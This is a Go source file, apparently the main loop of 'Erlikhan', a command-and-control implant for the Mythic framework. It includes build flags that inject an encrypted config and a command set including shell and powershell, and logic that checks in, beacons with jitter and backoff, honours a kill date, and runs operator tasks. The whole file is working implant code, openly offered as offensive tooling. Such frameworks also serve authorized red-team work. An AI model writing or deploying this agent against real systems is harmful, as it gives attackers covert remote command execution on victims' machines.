// Erlikhan agent: Mythic implant (http, mqtt, dns, msteams), stdlib-only.
//
// Build with config injected:
//
//	go build -ldflags "-X main.cfgBlob=.. -X main.cfgKey=.. -X main.cfgNonce=.. -X main.includedCommands=shell,powershell,sleep,ls,exit"
package main

import (
	"os"
	"time"
)

func main() {
	if err := run(); err != nil {
		os.Exit(1)
	}
}

func run() error {
	cfg, err := loadConfig()
	if err != nil {
		return err
	}
	agent, err := newAgent(cfg)
	if err != nil {
		return err
	}
	killdate, err := parseKilldate(cfg.Killdate)
	if err != nil {
		return err
	}
	retries := cfg.Retries
	if retries < 1 {
		retries = 1
	}
	backoff := agent.interval
	for tries := 1; ; tries++ {
		if pastKilldate(killdate) {
			return nil
		}
		if err := agent.checkin(); err == nil {
			break
		} else if tries >= retries {
			return err
		}
		time.Sleep(sleepTime(backoff, agent.jitter))
		backoff *= 2
	}
	for {
		if pastKilldate(killdate) {
			return nil
		}
		tasks, err := agent.getTasking()
		if err != nil {
			time.Sleep(sleepTime(agent.interval, agent.jitter))
			continue
		}
		var responses []Response
		exit := false
		for _, t := range tasks {
			resp, done := agent.dispatch(t)
			responses = append(responses, resp)
			exit = exit || done
		}
		if len(responses) > 0 {
			if err := agent.postResponses(responses); err != nil {
				time.Sleep(sleepTime(agent.interval, agent.jitter))
				continue
			}
		}
		if exit {
			return nil
		}
		time.Sleep(sleepTime(agent.interval, agent.jitter))
	}
}

// parseKilldate reads YYYY-MM-DD. Empty means no kill date (zero time).
func parseKilldate(s string) (time.Time, error) {
	if s == "" {
		return time.Time{}, nil
	}
	return time.Parse("2006-01-02", s)
}

func pastKilldate(killdate time.Time) bool {
	if killdate.IsZero() {
		return false
	}
	now := time.Now()
	today := time.Date(now.Year(), now.Month(), now.Day(), 0, 0, 0, 0, now.Location())
	return !today.Before(killdate)
}
